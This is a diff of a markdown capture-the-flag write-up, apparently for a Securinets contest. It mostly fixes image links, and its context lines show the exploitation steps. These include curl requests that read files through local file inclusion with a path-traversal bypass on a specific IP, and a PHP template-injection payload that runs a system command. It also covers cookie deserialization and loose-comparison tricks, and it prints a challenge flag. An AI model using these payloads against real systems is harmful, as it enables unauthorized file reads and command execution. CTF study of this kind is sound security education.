@@ -83,9 +83,10 @@ After reading the source code we can find that
 - the command we supply in is being executed but there's a blacklist of the multiple commands.
 - In `/gallery` route there's a LFI and a blacklist for reading the flag directly, or that was the intended path in the challenge to read only ``app.py`` with 
 ``curl http://98.66.180.82:1024/gallery?file=../app/app.py``
-- until my teammate ``[EL_GASTRA](https://github.com/ghassen202)``  noticed that we can simply bypass the flag check by using
+- until my teammate [EL_GASTRA](https://github.com/ghassen202)  noticed that we can simply bypass the flag check by using
 ``curl http://98.66.180.82:1024/gallery?file=/app//flag.txt``
-![[Pasted image 20250223173359.png]]
+
+![](Images/Pasted%20image%2020250223173359.png)
 
 Going back to our direct solve method, we have an idea what the server is doing so we can craft the following solver.py
 
@@ -117,8 +118,8 @@ And we can get the flag.txt which is
 **Securinets{G00d_Ch4in_m00rtYYY!}**
 
 > Poc
+![Pasted image 20250223221256](https://github.com/user-attachments/assets/eb4e29e7-6a1c-41ca-9465-ee816b5337f8)
 
-![](Images/Pasted%20image%2020250223173359.png)
 ## II. PHP Jail
 The next challenge is a php jail;
 ```php
@@ -190,7 +191,8 @@ parse={if:3<4)('s'.'ystem')('cat *.txt');//}ndl{end if}
 
 Final request:
 >Poc
-![](Pasted%20image%2020250223215518.png)
+
+![Pasted image 20250223215518](https://github.com/user-attachments/assets/bf14c604-520f-4fe2-beac-abc0163b016d)
 ## III. Chained Together
 This challenge comes with a source code we first check `contact.php`
 ```php
@@ -288,7 +290,7 @@ cat flag.txt
 ```
 
 >Poc
-![](Pasted%20image%2020250223183015.png)
+![Pasted image 20250223183015](https://github.com/user-attachments/assets/3ea7e73a-5a41-468c-855c-f03cf1997b12)
 
 ## IV. SerialKiller 🔪
 For this task we got `secrets.php` where the app uses PHP’s `unserialize()` function on user-controlled cookie data
@@ -345,7 +347,8 @@ php >
 
 And finally we send our payload to get admin account:
 >Poc
-![](Pasted%20image%2020250223214610.png)
+
+![Pasted image 20250223223503](https://github.com/user-attachments/assets/fc768252-bb93-41e3-aa7b-5e2bf04320d1)
 
 ## V. SerialKiller Pro Max 🔪🩸
 For this task we got the same logic of the app, but this time without the secret 
@@ -385,7 +388,9 @@ if ($user->username==='admin' && $user->token=='REDACTED'):
 First we got 2 types of comparisons in php:
 - **Loose** comparison: using `== or !=` : both variables have "the same value".
 - **Strict** comparison: using `=== or !==` : both variables have "the same type and the same value".
-You can find more here:![](Pasted%20image%2020250223221421.png)
+
+You can find more here:
+![Pasted image 20250223221421](https://github.com/user-attachments/assets/b86f2412-2130-4cd7-87bf-3c593a412697)
 
 From this table we know that with **=*=*** we can get a ==TRUE== statement when sending a Boolean value
 ```php
